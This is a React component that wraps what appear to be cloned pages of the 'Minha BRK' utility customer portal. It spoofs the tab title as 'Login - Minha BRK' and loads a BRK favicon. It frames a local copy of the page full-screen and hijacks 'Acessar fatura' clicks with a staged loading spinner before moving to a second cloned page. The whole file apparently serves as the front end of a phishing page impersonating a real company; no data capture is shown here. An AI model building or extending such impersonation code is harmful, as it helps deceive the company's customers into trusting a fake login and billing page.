import { useEffect, useRef, useState } from "react";

export default function PaginaBRK() {
  const iframeRef = useRef(null);
  const [src, setSrc] = useState("/paginabrk.html");
  const [loading, setLoading] = useState(false);

  useEffect(() => {
    const prev = document.title;
    document.title = "Login - Minha BRK";

    const existing = document.querySelector("link[rel~='icon']");
    const prevHref = existing ? existing.getAttribute("href") : null;
    let link = existing;
    if (!link) {
      link = document.createElement("link");
      link.setAttribute("rel", "icon");
      document.head.appendChild(link);
    }
    link.setAttribute("type", "image/x-icon");
    link.setAttribute("href", "/brk-favicon.ico");

    return () => {
      document.title = prev;
      if (prevHref) link.setAttribute("href", prevHref);
    };
  }, []);

  const handleLoad = () => {
    setLoading(false);
    const ifr = iframeRef.current;
    if (!ifr) return;
    let doc;
    try {
      doc = ifr.contentDocument;
      if (!doc || !ifr.contentWindow.location.pathname.endsWith("/paginabrk.html")) return;
    } catch (e) {
      return;
    }
    doc.querySelectorAll("button, a").forEach((el) => {
      if (el.textContent && el.textContent.trim().includes("Acessar fatura")) {
        el.addEventListener(
          "click",
          (e) => {
            e.preventDefault();
            e.stopPropagation();
            console.log("[BRK] button clicked, showing spinner");
            setLoading(true);
            setTimeout(() => {
              console.log("[BRK] navigating to page2");
              try {
                ifr.contentWindow.location.href = "/paginabrk2.html";
              } catch (err) {
                console.log("[BRK] nav error", err);
              }
            }, 1000);
          },
          true
        );
      }
    });
  };

  return (
    <>
      <style>{`@keyframes brk-spin{to{transform:rotate(360deg)}}`}</style>
      <iframe
        ref={iframeRef}
        data-testid="pagina-brk-frame"
        src={src}
        title="Minha BRK"
        onLoad={handleLoad}
        style={{ position: "fixed", inset: 0, width: "100%", height: "100%", border: "none" }}
      />
      {loading && (
        <div
          data-testid="brk-loading-overlay"
          style={{
            position: "fixed",
            inset: 0,
            display: "flex",
            alignItems: "center",
            justifyContent: "center",
            background: "rgba(255,255,255,0.75)",
            zIndex: 9999,
          }}
        >
          <div
            style={{
              width: 48,
              height: 48,
              borderRadius: "50%",
              border: "4px solid #aad5ed",
              borderTopColor: "#0066cc",
              animation: "brk-spin 0.8s linear infinite",
            }}
          />
        </div>
      )}
    </>
  );
}
